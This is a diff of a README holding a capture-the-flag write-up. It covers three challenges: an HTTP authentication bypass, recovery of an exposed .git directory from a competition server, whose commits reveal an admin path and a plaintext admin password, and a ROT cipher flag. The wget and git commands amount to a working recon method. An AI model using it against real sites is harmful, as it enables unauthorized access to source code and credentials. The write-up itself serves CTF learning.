@@ -1,10 +1,10 @@
 # EG-CTF
 # Write-Up
-# 1-Tamp3rat0r
+# 1-Tamp3rat0r(web)
 I have check the site and They asked me about username and password and by guess seems like http authentication bypass
 and worked. check Tamp3rat0r.py
-# 2-Hold Up
-i test it with DWP and i found /.git path working and i download the directory <br/>
+# 2-Hold Up(web)
+I have test it with "DWP" and i found /.git path working and i download the directory <br/>
 root@cloudshell: wget --recursive --no-parent http://172.105.76.128/.git/ <br/>
 root@cloudshell: ls<br/>
 172.105.76.128  <br/>
@@ -16,7 +16,7 @@ root@cloudshell:/172.105.76.128/.git ls <br/>
 branches        config       HEAD   index       index.html?C=D;O=A  index.html?C=M;O=A  index.html?C=N;O=A  index.html?C=S;O=A  info  objects<br/>
 COMMIT_EDITMSG  description  hooks  index.html  index.html?C=D;O=D  index.html?C=M;O=D  index.html?C=N;O=D  index.html?C=S;O=D  logs <br/> refs<br/>
 //////////////////////////////////////////<br/>
-// let's check the commits<br/>
+// Let's check the commits<br/>
 //////////////////////////////////////////<br/>
 root@cloudshell:/172.105.76.128/.git git reflog<br/>
 2e3e1a8 HEAD@{0}: commit: Refining<br/>
@@ -56,7 +56,7 @@ index 3d7f801..706d93b 100644<br/>
    This option allows you to define a manual override condition as a regular<br/>
    expression for the remote IP address. The keys `overwritewebroot`,<br/>
    //////////////////////////////////////////////////<br/>
-// this show us the path of admin login is /S3cR3tPaTh/<br/>
+// This show us the path of admin login is /S3cR3tPaTh/<br/>
 /////////////////////////////////////////////////////////<br/>
 root@cloudshell:/172.105.76.128/.gitgit show 5b9e491<br/>
 commit 5b9e491802d53d6af1ef25206ccb0765b64a248b<br/>
@@ -91,6 +91,10 @@ index 46ed4f3..72e9842 100644<br/>
 ///////////////////////////////////////////////////////////////// <br/>
 admin = Administrator <br/>
 password = FN3ym@bZNaF& <br/>
-after i try it #flag : EGCTF{Co0o0o0L_I_g0t_Th3_R3p0} <br/>
-sorry if something it's not clear <br/>
+After i try it #flag : EGCTF{Co0o0o0L_I_g0t_Th3_R3p0} <br/>
+Sorry if something it's not clear <br/>
 ////////////////////////////////////////////////////////////////// <br/>
+# Rotten Code (Starter)
+CEARD{Pmr14_jm0m0m0m0m0m0m0m0m0m0mn}<br/>
+I try rot2 and i found the flag <br/>
+#flag : EGCTF{Rot14_lo0o0o0o0o0o0o0o0o0o0op}
